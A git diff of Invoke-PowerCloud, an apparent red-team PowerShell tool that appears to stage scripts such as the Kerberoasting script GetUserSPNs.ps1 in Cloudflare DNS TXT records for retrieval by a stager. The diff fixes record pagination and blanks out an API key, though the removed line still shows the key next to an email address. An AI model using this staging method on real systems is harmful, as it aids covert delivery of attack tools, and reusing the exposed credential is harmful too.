@@ -14,7 +14,7 @@ function Invoke-PowerCloud() {
 )
 
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $Global:API = "8005d393edc8a713d15702606c7ae24c632a0"
+    $Global:API = ""
     $Global:zoneId = ""
     $Global:API_URL = "https://api.cloudflare.com/client/v4"
     $Global:EMAIL = "mantvydo@gmail.com"
@@ -107,13 +107,17 @@ function Invoke-PowerCloud() {
 
     function Get-DNSRecords($page, $dnsRecords) {
         Write-Verbose "[*] Getting DNS TXT records for $Domain"
-        $url = "/zones/$Global:zoneId/dns_records?type=TXT&per_page=100?page=$page"
-        $dnsRecords = ConvertFrom-Json ((Invoke-GetRequest $url).Content)
-        $pageCount = [math]::ceiling($dnsRecords.result_info.total_count / 100)
-        $dnsRecords += $dnsRecords | select-object -ExpandProperty "result"
+        $page = 1
+        $pageCount = 1
+        $dnsRecords = @{"result" = New-Object System.Collections.ArrayList }
         
-        if ($page -lt $pageCount) {
-            Get-DNSRecords $page++ $dnsRecords
+        while ($page -le $pageCount) {
+            $url = "/zones/$Global:zoneId/dns_records?type=TXT&per_page=100&page=$page"
+            $response = ConvertFrom-Json ((Invoke-GetRequest $url).Content)
+            $pageCount = $response.result_info.total_pages
+            $dnsRecords.result += $response.result
+            # $dnsRecords.result.add($response.result)
+            $page++
         }
 
         return $dnsRecords
@@ -178,3 +182,5 @@ function Invoke-PowerCloud() {
     Upload-DNSZoneFile $zoneFile.content
     Write-Stager $zoneFile.count $nameServer
 }
+
+Invoke-PowerCloud -FilePath C:\tools\powercloud\GetUserSPNs.ps1 -domain redteam.me
